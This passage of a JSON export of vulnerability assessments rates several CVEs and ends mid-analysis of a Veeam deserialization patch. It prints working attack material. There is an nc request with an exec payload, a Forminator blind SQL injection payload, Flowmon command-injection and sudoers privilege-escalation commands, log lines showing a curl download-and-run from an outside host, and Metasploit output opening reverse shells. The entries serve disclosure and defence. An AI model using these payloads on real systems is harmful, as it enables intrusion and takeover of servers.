macro which will stop all processing.\r\n\r\n```\r\n$ echo -ne \"GET /?search=%25x%25url%25:%host%}{.exec|notepad.}{.break.} HTTP/1.1\\r\\nHost:\\r\\n\\r\\n\" | nc 192.168.86.35 80\r\n```\r\n\r\nI have rated the exploitability of this vulnerability as very high, as it is trivial to exploit by a remote unauthenticated attacker. I have rated the attacker value as low as this is not an enterprise web server.",
      "score": 4,
      "metadata": {
        "attacker-value": 2,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "04d81142-6675-4a32-8d7f-e573b8f7ddde",
      "editorId": "d603b493-1c7b-4ee8-972f-185269cce6d3",
      "topicId": "cf99e89f-3884-4464-8a5b-c64435cf0c4e",
      "created": "2024-06-10T17:00:37.225693Z",
      "revisionDate": "2024-06-11T21:18:21.006231Z",
      "document": "I have rated the attacker value as high, as if the requirement to exploitation are met the attacker can get remote unauthenticated RCE on the target Windows server. I have rated the Exploitability as Low as there are several prerequisites for a target to be vulnerable, specifically.\r\n* Target must be a web server running on a Windows system. A Web server on Linux for example can not be vulnerable. Currently I have only seen vulnerable Apache based configurations. I could not get IIS to be vulnerable during testing.\r\n* Target webserver must expose PHP in CGI mode (as opposed to FastCGI mode which is generally more common), or expose the CGI binary directly through an Apache `ScriptAlias` directive.\r\n* The target Windows OS must have its system locale set to either Japanese (Code page 932) or Chinese (Code pages 950 or 936). For this reason most systems that meet the other requirements will not be exploitable, as the systems locale must use a code page that can cause the vulnerability.\r\n\r\nIt is worth noting that XAMPP for Windows is in a vulnerable configuration by default, however the target Windows system XAMPP is running on still must meet the locale requirement of either Japanese or Chinese as mentioned above.",
      "score": 2,
      "metadata": {
        "attacker-value": 4,
        "exploitability": 2
      },
      "tags": [
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "795f5056-8a39-4610-912c-c033bd6fd4cb",
          "name": "Vulnerable in uncommon configuration",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "obscure_configuration"
        }
      ]
    },
    {
      "id": "a8ea00b2-323b-4d09-b313-3cfc404d8542",
      "editorId": "d603b493-1c7b-4ee8-972f-185269cce6d3",
      "topicId": "ec88a622-e23a-4ed4-b4bd-adca7bee9acf",
      "created": "2024-06-13T09:17:26.228704Z",
      "revisionDate": "2024-06-13T13:03:46.334789Z",
      "document": "Based upon our [Rapid7 Analysis](https://attackerkb.com/topics/2k7UrkHyl3/cve-2024-28995/rapid7-analysis), I have rated the attacker value of this vulnerability as Very High, as an unauthenticated attacker can read files from a server, and the vulnerable product is a file tranfser solution. I have rated the exploitability as Very High, as exploitation is trivial.",
      "score": 2,
      "metadata": {
        "attacker-value": 5,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "00f64473-c826-4bb2-b199-25069dd56068",
      "editorId": "2eaa3513-d5cc-4d30-9aac-068750ebcb69",
      "topicId": "1c143f67-33af-408e-b423-b583de79cd9f",
      "created": "2024-06-13T10:02:54.354421Z",
      "revisionDate": "2024-06-13T10:02:54.354828Z",
      "document": "",
      "score": 1,
      "metadata": {
        "mitre-tactics": "Persistence",
        "attacker-value": 4,
        "exploitability": 4
      },
      "tags": [
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        }
      ]
    },
    {
      "id": "3652f19f-55a2-4ba0-95ba-ff07a429c23d",
      "editorId": "b68e9cb9-1bd0-4339-abe7-329618ce2467",
      "topicId": "7de8314d-f4fe-4d79-85ea-27f97fb6ba31",
      "created": "2024-06-18T16:31:17.141033Z",
      "revisionDate": "2024-07-01T08:08:39.155467Z",
      "document": "Forminator Wordpress plugin versions prior to 1.29.3 are vulnerable to SQL injection. After investigating the [changes](https://plugins.trac.wordpress.org/changeset?sfp_email=&sfph_mail=&reponame=&new=3066927%40forminator&old=3047085%40forminator&sfp_email=&sfph_mail=#file3) made in version 1.29.3, it is easy to see that no input sanitization was done on the `order_by` and `order` parameters before being concatenated to the SQL statement. This code lies in the `get_filter_entries()` function in `library/model/class-form-entry-model.php`:\r\n```php\r\n\t\t$order_by = 'ORDER BY entries.entry_id';\r\n\t\tif ( isset( $filters['order_by'] ) ) {\r\n\t\t\t$order_by = 'ORDER BY ' . esc_sql( $filters['order_by'] ); // unesacaped.\r\n\t\t}\r\n\t\t$order = 'DESC';\r\n\t\tif ( isset( $filters['order'] ) ) {\r\n\t\t\t$order = esc_sql( $filters['order'] );\r\n\t\t}\r\n\r\n\t\t// group.\r\n\t\t$group_by = 'GROUP BY entries.entry_id';\r\n\r\n\t\t$sql     = \"SELECT entries.`entry_id` FROM {$table_name} entries\r\n\t\t\t\t\t\tINNER JOIN {$entries_meta_table_name} AS metas\r\n    \t\t\t\t\tON (entries.entry_id = metas.entry_id)\r\n \t\t\t\t\t\tWHERE {$where} {$group_by} {$order_by} {$order}\";\r\n\t\t$results = $wpdb->get_results( $wpdb->prepare( $sql, $form_id ) ); // phpcs:ignore WordPress.DB.PreparedSQL.NotPrepared\r\n```\r\n\r\nThis function is called by `_prepare_export_data()` in `library/class-export.php` when exporting Quiz or Form data as a CSV or sent as an attachment via email. This code path is reached when filters like `order` or `order_by` are used in the query.\r\n\r\nTo demonstrate this, authenticate as an admin to access the Wordpress Admin Dashboard, go to `/wp-admin/admin.php?page=forminator-entries`, click on the filter button on the right hand side of the submission list, add some filters and click `APPLY`. The ones that interest us are `Sort By` and `Sort Order`. Then, click on `EXPORT`, select `Apply Submission Filters` in the `Manual Exports` section and click `DOWNLOAD CSV`.\r\n\r\nThis will send the following POST request:\r\n```\r\nPOST /wp-admin/admin.php?page=forminator-entries&form_type=forminator_forms&form_id=7&entries-action&date_range&min_id&max_id&search&order_by=entries.date_created&order=DESC&entry_status=all&entries-action-bottom HTTP/1.1\r\nHost: localhost:8080\r\nContent-Length: 96\r\n\u2026[SNIP]...\r\n\r\nforminator_export=1&form_id=7&form_type=cform&_forminator_nonce=ed27a59f8a&submission-filter=yes\r\n```\r\n\r\nIt should return the submission entries in CSV format.\r\n\r\nNow, let's inject some SQL commands in the `order_by` parameter. According to the code, the vulnerable SQL query should not return anything in the response and we'll need to go with [blind SQLi](https://owasp.org/www-community/attacks/Blind_SQL_Injection). Since it will be concatenated to the `ORDER BY` clause, we will use the following query:\r\n```\r\n1,(select if((1=1),1,(select 1 union select 2)))\r\n```\r\nIf the `if` condition is true, the submission entries should be returned. If it is false, an empty list should be returned:\r\n- True (`1=1`)\r\n![True result](https://raw.githubusercontent.com/cdelafuente-r7/akb_data/main/CVE-2024-31077/true.png)\r\n- False (`1=0`)\r\n![False result](https://github.com/cdelafuente-r7/akb_data/blob/main/CVE-2024-31077/false.png?raw=true)\r\n\r\nMore precisely, it is an Blind Error-Based SQLi, since a `false` statement will fail with an SQL error: `ERROR 1242 (21000): Subquery returns more than 1 row`\r\n\r\nWe now confirmed that SQLi is possible.\r\n\r\nOne big caveat to this attack is that each time a CSV is required, Forminator updates the `forminator_exporter_log` Wordpress option with a timestamp:\r\n```php\r\n 124         $count = $export_data->entries_count;\r\n 125         // save the time for later uses.\r\n 126         $logs = get_option( 'forminator_exporter_log', array() );\r\n 127         if ( ! isset( $logs[ $model->id ] ) ) {\r\n 128             $logs[ $model->id ] = array();\r\n 129         }\r\n 130         $logs[ $model->id ][] = array(\r\n 131             'time'  => current_time( 'timestamp' ),\r\n 132             'count' => $count,\r\n 133         );\r\n 134         update_option( 'forminator_exporter_log', $logs );\r\n```\r\n\r\nThis will cause Wordpress to update the `forminator_exporter_log` option value in the `wp_options` table each time a request is received. This code is not overwriting the previous timestamp but actually adding a new timestamp to the option each time a CSV is required. As a result, the `forminator_exporter_log` option value will increase in size each time it is updated.\r\n\r\nThis is not a big problem per se, but if [binary logging](https://dev.mysql.com/doc/refman/8.4/en/binary-log.html) is enabled (it is enabled by default from MySQL 8.0), each database update will add an event to the binary log file (`binlog.*`). Since a blind SQLi usually requires a lot of queries, the binary log files will increase exponentially and quickly fill out all the disk space on the MySQL server. This will end up causing a DoS (it happened to me many times while investigating).\r\n\r\nTo conclude, this vulnerability is relatively easy to exploit but requires privileged access to Wordpress in order to reach the Forminator CSV export functionality. Even with these privileges, it is very likely to cause a DoS before any useful data is retrieved from the database.",
      "score": 3,
      "metadata": {
        "attacker-value": 1,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "0e696d6d-665a-48bd-9636-06d0a3a2a211",
          "name": "Requires elevated access",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "requires_elevated_access"
        }
      ]
    },
    {
      "id": "eac89c1b-f915-4cc4-be12-3c7e647408a1",
      "editorId": "de2686f1-1a8a-4518-8379-12188d859523",
      "topicId": "1b2a44ce-4877-439d-b7f3-ef238194d0a6",
      "created": "2024-06-19T20:34:43.35588Z",
      "revisionDate": "2024-07-01T08:08:37.912174Z",
      "document": "Progress Flowmon is a network performance monitoring and security solution developed by Progress Software. It is designed to provide detailed visibility into network traffic and performance, helping organizations to monitor, analyze, and secure their networks effectively.\r\n\r\nIn Flowmon versions prior to 11.1.14 and 12.3.5, an OS command injection vulnerability exists allowing unauthenticated users to execute code in the context of the `flowmon` user. The vulnerable endpoint which is accessible without authentication is `/service.pdfs/confluence`. This endpoint is used to generate PDFs for the application and accepts three parameters when targeted with a `GET` request. \r\n\r\nThe parameters that the `GET` request expects, as seen below, are `lang`, `file` and `pluginPath`. \r\n![Screenshot 2024-06-19 at 11 28 50\u202fAM](https://github.com/rapid7/metasploit-framework/assets/23320005/2f8ca202-8cfc-43cf-b663-ce52dffe587d)\r\n\r\nThe `pluginPath` parameter doesn't get sanitized and then gets used to build a `$url` path:\r\n![Screenshot 2024-06-19 at 11 52 10\u202fAM](https://github.com/rapid7/metasploit-framework/assets/23320005/4af5aa54-7de6-4b88-b4c9-e29f2b679d85)\r\n\r\nThe unsanitized `$url` string gets sent to the `$pdfGenerator->generate()` method. This method eventually calls the `run($command)` method inside `/var/www/app/flowmon/models/Exec.php` which is a wrapper for running system commands which attempts to generate the PDF with the supplied parameters. \r\n\r\n![Screenshot 2024-06-19 at 1 44 55\u202fPM](https://github.com/rapid7/metasploit-framework/assets/23320005/5c6c2c4a-2f7b-43cc-8b20-b0b429e49dd4)\r\n\r\nSee how it only sends one `$command` argument to the `run` function? This is the crux of the vulnerability which we will explore further in a moment. \r\n\r\nA couple things to note here. First, the ironic function definition which states `Should prevent cli injection`\r\n![Screenshot 2024-06-19 at 12 06 35\u202fPM](https://github.com/rapid7/metasploit-framework/assets/23320005/7c8d03d8-7263-48c0-94bc-0b1e50354b9a)\r\n\r\nWhat's interesting is that if this function was used in the way it was intended, the `pluginPath` parameter likely wouldn't be exploitable. The `run` function accepts a second parameter which is an array of command arguments which are enclosed in quotes using the `escapeshellarg()` function which does indeed prevent cli injection. \r\n\r\nHowever, the vulnerability exists because when the command is passed to the `run` function, it is passed as a long string into the first `$command` parameter and does not make use of the `$command_args` array which gets sanitized.  Due to this it's possible to escape the command using:  `$(<aribitrary command here>)` which allows you to execute commands in the context of the `flowmon` user. \r\n\r\n### Priv Escalation pairing list \r\n\r\nWhat better to complement a command injection exploit than a privilege escalation technique which was left unpatched by the vendor. \r\n\r\nThe `flowmon` user on affected devices are allowed to run a long list of commands with `sudo` privileges. Below is an excerpt, run `sudo -l` to see the full list:\r\n```\r\n    (root) NOPASSWD: /usr/sbin/lshw\r\n    (root) NOPASSWD: /opt/MegaRAID/MegaCli/MegaCli64\r\n    (root) NOPASSWD: /etc/invea-tech/hanic/hanic-flowmon\r\n    (root) NOPASSWD: /sbin/ip route\r\n    (root) NOPASSWD: /usr/local/bin/remote_storage\r\n    (root) NOPASSWD: /usr/bin/php /var/www/shtml/index.php Cli\\:AddNewSource *\r\n    (root) NOPASSWD: /etc/plugins/*/* *\r\n    (root) NOPASSWD: /usr/bin/net-snmp-config *\r\n    (root) NOPASSWD: /sbin/ip6tables\r\n    (root) NOPASSWD: /etc/init.d/fmd-widget-data\r\n    (root) NOPASSWD: /usr/sbin/SHC/self-health-checker.sh\r\n```\r\n\r\nThe command we're interested in exploiting is:\r\n```\r\n/usr/bin/php /var/www/shtml/index.php Cli\\:AddNewSource *\r\n```\r\n\r\nSimply because we have write access to the file `index.php`  which will get executed by `/usr/bin/php` with root privileges.\r\n```\r\nls -l  /var/www/shtml/index.php\r\n-rw-r--r-- 1 flowmon flowmon 1447 Jun 19 20:27 /var/www/shtml/index.php\r\n```\r\n\r\nWhat we can do is first back up the file `index.php`. Then overwrite it with a payload which gives unlimited sudo access to the `flowmon` user by appending the following to the `sudoers` file.\r\n```\r\necho \\'<?php system(\"echo \\\\\"ADMINS ALL=(ALL) NOPASSWD: ALL\\\\\" >> /etc/sudoers\"); ?>\\' > /var/www/shtml/index.php;\r\n```\r\n\r\nThen using the command mentioned above, run our payload which we overwrote to `index.php`.\r\n```\r\nsudo /usr/bin/php /var/www/shtml/index.php Cli\\\\:AddNewSource s;\r\n```\r\n\r\nNow we can drop whatever exploit we wish on to the target and run it with sudo:\r\n```\r\nsudo ./exploit_file.sh\r\n```\r\n\r\n\r\n### IoCs\r\nBy default there is logging in place which will log each exploit attempt of the command injection vulnerability `CVE-2024-2389`\r\nIn the `/var/www/log` folder the `exec-ui.log` logs when a PDF is attempted to be generated and you can see below the `$url` parameter is injected with our payload from the metasploit module.\r\n\r\nPayload in log line:\r\n\r\n`https:\\/\\/localhost\\/doc\\/$(curl -so .\\/LVdeSLLFVX http:\\/\\/192.168.101.78:8080\\/AYs_LPTV8IDulSzceZilCA; chmod +x .\\/LVdeSLLFVX; .\\/LVdeSLLFVX &)\\/locale\\/lp0nMaG2\\/index.html?file=1uwPuy5q.html&`\r\n\r\nFull log line: \r\n\r\n`./exec-ui.log:{\"level\":\"info\",\"requestId\":\"66677cd095e9a\",\"requestName\":\"HTTP - \\/service.pdfs\\/confluence\",\"timestamp\":\"2024-06-11 00:23:41.038700\",\"depth\":1,\"message\":\"Exec::run 'node \\/var\\/www\\/shtml\\/new-pdf-generator\\/pageToPdf.js input=\\\"https:\\/\\/localhost\\/doc\\/$(curl -so .\\/LVdeSLLFVX http:\\/\\/192.168.101.78:8080\\/AYs_LPTV8IDulSzceZilCA; chmod +x .\\/LVdeSLLFVX; .\\/LVdeSLLFVX &)\\/locale\\/lp0nMaG2\\/index.html?file=1uwPuy5q.html&print\\\" output=\\\"\\/var\\/www\\/shtml\\/pdf-generator\\/temp\\/doc_1uwPuy5q.pdf\\\" format=\\\"pdf\\\" reportsBrandingColor=\\\"#32A64E\\\" lang=\\\"en\\\" maxAttemptWaitingPage=\\\"60\\\" generateNotCompleted=\\\"0\\\"'\",\"context\":{\"output\":[\"2024-06-10T22:23:39.088Z - try to launch chromium\",\"2024-06-10T22:23:39.547Z - Chromium is launched.\",\"2024-06-10T22:23:39.548Z - Chromium open page with url: https:\\/\\/localhost\\/doc\\/\\/locale\\/lp0nMaG2\\/index.html?file=1uwPuy5q.html&print\",\"2024-06-10T22:23:40.992Z - Chromium cannot open page with url: https:\\/\\/localhost\\/doc\\/\\/locale\\/lp0nMaG2\\/index.html?file=1uwPuy5q.html&print.\",\"Error log: Status of page is: 404\",\"\",\"Added to log file.\"],\"ret\":3,\"command_args\":[],\"duration\":\"27069.765 ms\"},\"utime\":1718058221.038748,\"memory\":2,\"callee\":{\"project\":\"frontend\",\"file\":\"\\/var\\/www\\/app\\/flowmon\\/models\\/Exec.php\",\"line\":95}}`\r\n\r\nAlso the `process_logger.log` log file will also contain similar traces of exploitation attempts as seen below:\r\n\r\n`./process_logger.log:{\"level\":\"debug\",\"requestId\":\"66571e8fbb307\",\"requestName\":\"HTTP - \\/service.pdfs\\/confluence\",\"timestamp\":\"2024-05-29 14:24:48.631800\",\"depth\":1,\"message\":\"Command\",\"context\":[\"node \\/var\\/www\\/shtml\\/new-pdf-generator\\/pageToPdf.js input=\\\"https:\\/\\/localhost\\/doc\\/$(curl -so .\\/zLxWJANP http:\\/\\/192.168.50.78:8080\\/Eprv7SVWQHIInVrWn0A4hg; chmod +x .\\/zLxWJANP; .\\/zLxWJANP &)\\/locale\\/0s8IAXCf\\/index.html?file=eCGyQX4r.html&print\\\" output=\\\"\\/var\\/www\\/shtml\\/pdf-generator\\/temp\\/doc_eCGyQX4r.pdf\\\" format=\\\"pdf\\\" reportsBrandingColor=\\\"#32A64E\\\" lang=\\\"en\\\" maxAttemptWaitingPage=\\\"60\\\" generateNotCompleted=\\\"0\\\"\"],\"utime\":1716985488.6317589,\"memory\":12,\"callee\":{\"project\":\"frontend\",\"file\":\"\\/var\\/www\\/app\\/flowmon\\/ServiceModule\\/PdfsModule\\/models\\/PdfGenerator.php\",\"line\":91}}`\r\n\r\nAs for the privilege escalation vuln, it is a bit more difficult to determine if it has been exploited. The `process_logger.log` log file does indicate when the vulnerable sudo command gets called ` Cli\\\\:AddNewSource s` but because we overwrite the `index.php` file in order to exploit this vuln, in the logs there's no way of telling if this call to `CliPresenter.php` was malicious. \r\n\r\n`./process_logger.log:{\"level\":\"info\",\"requestId\":\"66677b9e439c1\",\"requestName\":\"CLI - Cli:AddNewSource\",\"timestamp\":\"2024-06-11 00:18:06.284900\",\"depth\":0,\"message\":\"Cli:AddNewSource started\",\"context\":{\"isDaEnabled\":false,\"isProxy\":false,\"isAssigned\":false,\"parameters\":{\"module\":\":\",\"action\":\"AddNewSource\"}},\"utime\":1718057886.2848589,\"memory\":18,\"callee\":{\"project\":\"frontend\",\"file\":\"\\/var\\/www\\/app\\/flowmon\\/presenters\\/CliPresenter.php\",\"line\":768}}`\r\n\r\nWhen the metasploit module exploits the priv esc it:\r\n1. Over writes `/var/www/shtml/index.php`\r\n2. Edits `/etc/sudoers`\r\n3. Drops a payload to disk\r\n\r\nIt creates a number of IoCs but it cleans them all up. In the event a malicious attacker exploits the priv esc in a similar fashion without using the metasploit and fails to clean up after themselves there would be some very obvious signs of exploitation. One being that if you fail to restore `index.php` (the page that you get redirected to immediately when navigating to the Progress Flomon's HTTP server) you will be greeted by a page containing part of the exploit: \r\n\r\n![Screenshot 2024-06-19 at 12 56 27\u202fPM](https://github.com/rapid7/metasploit-framework/assets/23320005/f0b61b9a-7ca9-4569-adef-e89a144a6a82)\r\n\r\n### Attacker Value and Exploitability\r\n\r\nIt's been some time since I gave a 5/5 for both attacker value and exploitability - though this exploit seems well deserving of both those ratings. I feel the attacker value is only heightened by the fact that the vendor decided not to acknowledge/ patch the priv esc.  Both vulns are trivial to exploit and are exploitable without authentication. This one is a doozy, patching is recommended asap \r\n\r\n### Metasploit modules in action\r\n#### Command injection\r\n```\r\nmsf6 exploit(linux/http/progress_flowmon_unauth_cmd_injection) > show options\r\n\r\nModule options (exploit/linux/http/progress_flowmon_unauth_cmd_injection):\r\n\r\n   Name       Current Setting  Required  Description\r\n   ----       ---------------  --------  -----------\r\n   PRIVESC    true             yes       Automatically try privesc to add sudo entry\r\n   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]\r\n   RHOSTS     172.174.209.101  yes       The target host(s), see https://docs.metasploit.com/docs/using-meta sploit/basics/using-metasploit.html\r\n   RPORT      443              yes       The target port (TCP)\r\n   SSL        true             no        Negotiate SSL/TLS for outgoing connections\r\n   TARGETURI  /                yes       The URI path to Flowmon\r\n   VHOST                       no        HTTP server virtual host\r\n\r\n\r\nPayload options (cmd/linux/http/x64/meterpreter_reverse_tcp):\r\n\r\n   Name                Current Setting  Required  Description\r\n   ----                ---------------  --------  -----------\r\n   FETCH_COMMAND       CURL             yes       Command to fetch payload (Accepted: CURL, FTP, TFTP, TNFTP\r\n                                                  , WGET)\r\n   FETCH_DELETE        false            yes       Attempt to delete the binary after execution\r\n   FETCH_FILENAME      TkHAXYbQwlH      no        Name to use on remote system when storing payload; cannot contain spaces or slashes\r\n   FETCH_SRVHOST                        no        Local IP to use for serving payload\r\n   FETCH_SRVPORT       8080             yes       Local port to use for serving payload\r\n   FETCH_URIPATH                        no        Local URI to use for serving payload\r\n   FETCH_WRITABLE_DIR                   yes       Remote writable dir to store payload; cannot contain space\r\n                                                  s\r\n   LHOST               138.111.211.11   yes       The listen address (an interface may be specified)\r\n   LPORT               4444             yes       The listen port\r\n\r\n\r\nExploit target:\r\n\r\n   Id  Name\r\n   --  ----\r\n   0   Automatic\r\n\r\n\r\n\r\nView the full module info with the info, or info -d command.\r\n\r\nmsf6 exploit(linux/http/flowmon_unauth_cmd_injection) > run\r\n\r\n[*] Started reverse TCP handler on 138.111.211.11:4444\r\n[*] Running automatic check (\"set AutoCheck false\" to disable)\r\n[*] Checking if 172.174.209.101:443 can be exploited!\r\n[*] Detected version: 12.02.06\r\n[+] The target is vulnerable. Version 12.02.06 is vulnerable.\r\n[*] Attempting to execute payload...\r\n[*] Meterpreter session 1 opened (138.111.211.11:4444 -> 172.174.209.101:48856) at 2024-05-01 15:22:24 +0000\r\n\r\nmeterpreter > sysinfo\r\nComputer     : flowmon.my3m4o21xjze5fomtxp5e53h2h.bx.internal.cloudapp.net\r\nOS           : CentOS 7.9.2009 (Linux 3.10.0-1160.76.1.el7.flowmon.x86_64)\r\nArchitecture : x64\r\nBuildTuple   : x86_64-linux-musl\r\nMeterpreter  : x64/linux\r\nmeterpreter > getuid\r\nServer username: flowmon\r\n```\r\n\r\n#### Privilege Escalation\r\n```\r\nmsf6 exploit(linux/local/progress_flowmon_sudo_privesc_2024) > sessions -l\r\n\r\nActive sessions\r\n===============\r\n\r\n  Id  Name  Type                   Information                                  Connection\r\n  --  ----  ----                   -----------                                  ----------\r\n  5         meterpreter x64/linux  flowmon @ localhost.localdomain.localdomain  192.168.2.23:4444 -> 192.168.2.26:38328 (192.168.2.26)\r\n\r\nmsf6 exploit(linux/local/progress_flowmon_sudo_privesc_2024) > show options\r\n\r\nModule options (exploit/linux/local/progress_flowmon_sudo_privesc_2024):\r\n\r\n   Name          Current Setting  Required  Description\r\n   ----          ---------------  --------  -----------\r\n   SESSION       -1               yes       The session to run this module on\r\n   WRITABLE_DIR  /tmp             yes       A directory where we can write files\r\n\r\n\r\nPayload options (linux/x64/meterpreter/reverse_tcp):\r\n\r\n   Name   Current Setting  Required  Description\r\n   ----   ---------------  --------  -----------\r\n   LHOST  192.168.2.23     yes       The listen address (an interface may be specified)\r\n   LPORT  5555             yes       The listen port\r\n\r\n\r\nExploit target:\r\n\r\n   Id  Name\r\n   --  ----\r\n   0   Automatic\r\n\r\n\r\n\r\nView the full module info with the info, or info -d command.\r\n\r\nmsf6 exploit(linux/local/progress_flowmon_sudo_privesc) > run\r\n\r\n[*] Started reverse TCP handler on 192.168.2.23:5555\r\n[*] Running automatic check (\"set AutoCheck false\" to disable)\r\n[*] Found 2 indicators this is a Progress Flowmon product\r\n[!] The service is running, but could not be validated.\r\n[*] Saving payload as /tmp/.fovaiiazfuhl\r\n[*] Overwriting /var/www/shtml/index.php with payload\r\n[*] Executing sudo to elevate privileges\r\n[*] Transmitting intermediate stager...(126 bytes)\r\n[*] Sending stage (3045380 bytes) to 192.168.2.26\r\n[+] Deleted /tmp/.fovaiiazfuhl\r\n[*] Cleaning up addition to /etc/sudoers\r\n[*] Meterpreter session 9 opened (192.168.2.23:5555 -> 192.168.2.26:33408) at 2024-05-23 16:46:10 -0400\r\n[*] Restoring /var/www/shtml/index.php file contents...\r\n\r\nmeterpreter > getuid\r\nServer username: root\r\nmeterpreter > sysinfo\r\nComputer     : localhost.localdomain.localdomain\r\nOS           : CentOS 7.9.2009 (Linux 3.10.0-1160.102.1.el7.flowmon.x86_64)\r\nArchitecture : x64\r\nBuildTuple   : x86_64-linux-musl\r\nMeterpreter  : x64/linux\r\nmeterpreter >\r\n```\r\n\r\n\r\n### References \r\nhttps://rhinosecuritylabs.com/research/cve-2024-2389-in-progress-flowmon/",
      "score": 3,
      "metadata": {
        "attacker-value": 5,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "9a2c9fe5-eca6-44d9-9eb6-107acd44172a",
      "editorId": "2dc5dd1e-c295-4dd9-bd7b-f3b77d6dbda5",
      "topicId": "d77d62a8-0a1a-4318-a0f1-153a9a1fd84c",
      "created": "2024-06-20T14:02:50.791204Z",
      "revisionDate": "2024-06-21T14:59:57.036638Z",
      "document": "This deserialization vulnerability piqued my interest after I saw it had received a [\"patch reissue\"](https://www.veeam.com/kb4575) a couple of weeks after it was initially patched. I was curious whether the secondary patch was necessary or more of a prophylactic measure. Due to time and software limitations, this assessment doesn't include PoC and is mostly based on static analysis; the primary goal of this is to provide more information about the risk of the vulnerability, as well as to document some information I've learned about the suite for researchers. \r\n\r\n### Software Overview\r\nCVE-2024-29212 targets Veeam Service Provider Console (\"VSPC\"), which is a rather niche product. From what I've learned, it's exclusively meant for managed service providers that resell Veeam \"backups as a service\". Despite not managing the Veeam infrastructure themselves, clients of these service providers still prefer having their own dashboard for backups. In that scenario, the service provider would set up VSPC and its bundled Web UI as an interface for those customers to manage backups and transmit their data to the centralized server. \r\n\r\nVSPC itself, which is predominantly written in C# .NET, is fairly complex, with [many different services and communication channels](https://helpcenter.veeam.com/docs/vac/deployment/images/ports.png). The ecosystem is primarily hosted by the service provider, and agent software continuously runs on the customer's managed systems. As shown in the diagram linked above, the client agent connects to the Veeam Cloud Gateway intermediary service via TCP port 6180. In turn, the Gateway service communicates this data to the Veeam Service Provider Console Server (\"VSPC Server\") over port 9999. VSPC Server also receives TCP data on port 1989 from the dedicated Web UI service back end, and the front-facing Web UI service listens on port 1280.\r\n\r\n### Exploitation Potential\r\nThe public attack surface for this specialized Veeam product appears to be minimal, based on Shodan queries; less than 100 VSPC Web UI servers were observed to be public-facing at the time of research. The vulnerability itself is also noted to be authenticated, which further lessens the likelihood of exploitation. Analysis appears to indicate that an attacker would need to acquire agent credentials from a managed system's client to target the service provider's VSPC system with a serialized payload. As a result, and considering the fact that this vulnerability was patched a few months back, CVE-2024-29212 appears to be at lower risk of widespread exploitation. \r\n\r\n### Patch Analysis\r\nThe most obvious security-related changes in the first patch are in a `SerializationBinder` class, `BinarySerializerVulnerabilityFilter`, within the `BindToType` method. This method is [called during deserialization](https://codewhitesec.blogspot.com/2022/06/bypassing-dotnet-serialization-binders.html), and it sources the resulting object's type from the data passed to it. The unpatched code is shown below. It includes a security check that throws an exception if the target assembly is a forbidden type AND the assembly name does not contain the string \"Veeam\".\r\n```C#\r\n\tpublic override Type BindToType(string assemblyName, string typeName)\r\n\t{\r\n\t\tint num = typeName.IndexOf(\",\", StringComparison.Ordinal);\r\n\t\tif (num > 0)\r\n\t\t{\r\n\t\t\ttypeName = typeName.Substring(0, num);\r\n\t\t}\r\n\t\tif (!assemblyName.ContainsIgnoreCase(\"Veeam\") && _forbiddenTypes.Any((string t) => typeName.EndsWith(t, StringComparison.OrdinalIgnoreCase)))\r\n\t\t{\r\n\t\t\tthrow new ArgumentException(\"Deserialization of type \" + typeName + \" is prohibited.\");\r\n\t\t}\r\n\t\treturn _wrappedBinder?.BindToType(assemblyName, typeName);\r\n\t}\r\n```\r\nThe `_forbiddenTypes` list, which was not changed, is as follows:\r\n`\"AxHost+State\", 